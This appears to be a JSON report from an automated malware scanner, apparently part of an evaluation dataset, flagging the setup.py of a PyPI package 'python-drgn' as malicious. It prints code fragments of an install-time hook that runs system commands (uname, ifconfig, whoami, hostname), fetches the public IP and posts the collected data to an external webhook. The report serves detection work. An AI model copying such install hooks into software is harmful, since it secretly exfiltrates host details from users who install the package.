{
  "package_name": "python-drgn-1.1.95",
  "total_matches": 16,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
      "file_name": "setup.py",
      "detection_count": 16,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is malicious. It defines a custom installation command for a Python package that, upon installation (not just execution), collects sensitive information from the host system, including the operating system details, current working directory, local and public IP addresses, the current user, and the hostname. It then exfiltrates all this information to a hardcoded external Slack webhook via an HTTP POST request. The use of os.popen to execute system commands and requests to send data externally, especially during package installation, is a common technique in supply chain attacks and is not legitimate behavior for a normal package install script.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "20",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "public_ip=requests.get('http://ifconfig.me').text",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at python-drgn-1.1.95/setup.py:20",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "25",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "public_ip=requests.get('http://ifconfig.me').text",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at python-drgn-1.1.95/setup.py:25",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "30",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "public_ip=requests.get('http://ifconfig.me').text",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at python-drgn-1.1.95/setup.py:30",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "36",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "public_ip=requests.get('http://ifconfig.me').text",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at python-drgn-1.1.95/setup.py:36",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "55",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(name='python-drgn', version='1.1.95',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})",
          "full_match": "* This package is overwriting the 'install' command in setup.py at python-drgn-1.1.95/setup.py:55",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "50",
          "type_description": "exfiltrate-sensitive-data: found 1 source code matches",
          "code_snippet": "requests.post(webhook, payload)",
          "full_match": "* This package is exfiltrating sensitive data to a remote server at python-drgn-1.1.95/setup.py:50",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "17",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "conf=os.popen('uname -a').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:17",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "19",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "ip=os.popen('ifconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:19",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "22",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "conf=os.popen('uname -a').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:22",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "24",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "ip=os.popen('ifconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:24",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "27",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "conf=os.popen('systeminfo').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:27",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "29",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "ip=os.popen('ipconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:29",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "33",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "conf=os.popen('uname -a').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:33",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "35",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "ip=os.popen('ifconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:35",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "40",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "who=(os.popen('whoami').read())",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:40",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        },
        {
          "line_number": "42",
          "type_description": "code-execution: found 10 source code matches",
          "code_snippet": "hostn=(os.popen('hostname').read())",
          "full_match": "* This package is executing OS commands in the setup.py file at python-drgn-1.1.95/setup.py:42",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/python-drgn-1.1.95/python-drgn-1.1.95/setup.py",
          "relative_path": "python-drgn-1.1.95/setup.py"
        }
      ]
    }
  ]
}